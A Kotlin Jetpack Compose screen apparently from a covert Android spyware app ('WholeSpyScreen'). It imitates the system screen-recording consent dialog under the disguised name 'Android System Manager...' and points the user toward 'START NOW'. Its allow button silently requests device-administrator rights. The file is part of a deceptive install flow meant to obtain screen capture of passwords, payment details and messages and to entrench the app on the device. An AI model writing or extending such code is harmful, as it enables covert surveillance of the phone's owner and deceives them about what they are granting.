package com.screening.app.featureInstallation.presentation.permissions

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material.MaterialTheme
import androidx.compose.material.Text
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Cast
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.ColorFilter
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import com.screening.app.featureInstallation.WholeSpyScreen
import com.screening.app.featureInstallation.presentation.permissions.components.PermissionFrame
import com.screening.app.receivers.ScreeningDeviceAdminReceiver
import com.screening.app.ui.sizes
import com.screening.app.ui.spacing
import com.screening.app.ui.theme.BlackColor
import com.screening.app.ui.theme.BlueDarkColor
import com.screening.app.ui.theme.RedColor
import com.screening.app.ui.theme.WhiteColor
import com.screening.app.R


@Composable
fun ScreenRecordPermissionAndroid10(
    onScreenChange : (WholeSpyScreen) -> Unit,
    viewModel: MainViewModel = hiltViewModel()
) {

    val localContext = LocalContext.current
    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult(),
        onResult = { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                val data: Intent? = result.data
            } else if (result.resultCode == Activity.RESULT_CANCELED) {

            }
        }
    )

    PermissionFrame(
        screen = Screen.ScreenRecordScreen,
        content = {
            Column(
                modifier = Modifier.fillMaxSize(),
                verticalArrangement = Arrangement.Center
            ) {

                ScreenRecordPermission10Title()
                ScreenRecordPermission10Detail()
                ScreenRecordPermission10Footer()
                StartNowImagePointer()
                Spacer(
                    modifier = Modifier
                        .height(MaterialTheme.spacing.x10Dp)
                        .background(
                            WhiteColor
                        )
                )
            }
        },
        skipPermission = { },
        allowPermission = {
            val demoDeviceAdmin = ComponentName(
                localContext,
                ScreeningDeviceAdminReceiver::class.java
            )
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(
                DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                demoDeviceAdmin
            )
            launcher.launch(intent)
        }
    )
}

@Composable
fun ScreenRecordPermission10Title() {
    Column(
        modifier = Modifier.fillMaxWidth(),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {

        Image(
            imageVector = Icons.Filled.Cast,
            modifier = Modifier.size(MaterialTheme.spacing.x2Dp),
            contentDescription = "Screen Cast",
            colorFilter = ColorFilter.tint(color = RedColor)
        )

        Text(
            text = "Start casting or recording with Android System Manager...?",
            modifier = Modifier
                .padding(
                    start = MaterialTheme.spacing.large,
                    end = MaterialTheme.spacing.large,
                    top = MaterialTheme.spacing.medium
                )
                .fillMaxWidth(),
            fontSize = MaterialTheme.sizes.large,
            fontWeight = FontWeight.SemiBold,
            color = BlackColor
        )
    }
}

@Composable
fun ScreenRecordPermission10Detail() {
    val annotatedString = buildAnnotatedString {
        withStyle(
            style = SpanStyle(
                color = BlackColor,
                fontWeight = FontWeight.Bold
            )
        ) {
            append("Android System Manager...")
        }
        append("will have access to all of the information that is visible on your screen or played from your phone while casting or recording. This includes information such as passwords, payment details, photos, messages and audio that you play.")
    }
    Text(
        text = annotatedString,
        modifier = Modifier.padding(
            start = MaterialTheme.spacing.medium,
            end = MaterialTheme.spacing.medium,
            top = MaterialTheme.spacing.extraSmall
        ),
        fontSize = MaterialTheme.sizes.medium,
        fontWeight = FontWeight.Normal,
        color = BlackColor
    )
}

@Composable
fun ScreenRecordPermission10Footer() {
    Row(
        horizontalArrangement = Arrangement.SpaceEvenly,
        modifier = Modifier
            .fillMaxWidth()
            .padding(MaterialTheme.spacing.medium)
    ) {
        Text(
            text = "CANCEL",
            color = BlueDarkColor,
            fontSize = MaterialTheme.sizes.medium,
            fontWeight = FontWeight.SemiBold
        )
        Spacer(modifier = Modifier.width(MaterialTheme.spacing.x2Dp))
        Text(
            text = "START NOW",
            color = BlueDarkColor,
            fontSize = MaterialTheme.sizes.medium,
            fontWeight = FontWeight.SemiBold
        )
    }
}

@Composable
fun StartNowImagePointer() {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(
                start = MaterialTheme.spacing.medium,
                end = MaterialTheme.spacing.medium
            ),
        horizontalArrangement = Arrangement.SpaceEvenly
    ) {
        Box(modifier = Modifier.size(0.dp)) {}
        Spacer(modifier = Modifier.width(MaterialTheme.spacing.x2Dp))
        Image(
            modifier = Modifier
                .size(MaterialTheme.spacing.x4Dp)
                .padding(end = MaterialTheme.spacing.xDp, bottom = MaterialTheme.spacing.xDp),
            painter = painterResource(id = R.drawable.hand_pointer),
            contentDescription = null,
        )
    }
}

@Preview
@Composable
fun ScreenRecordPermissionPreview() {

}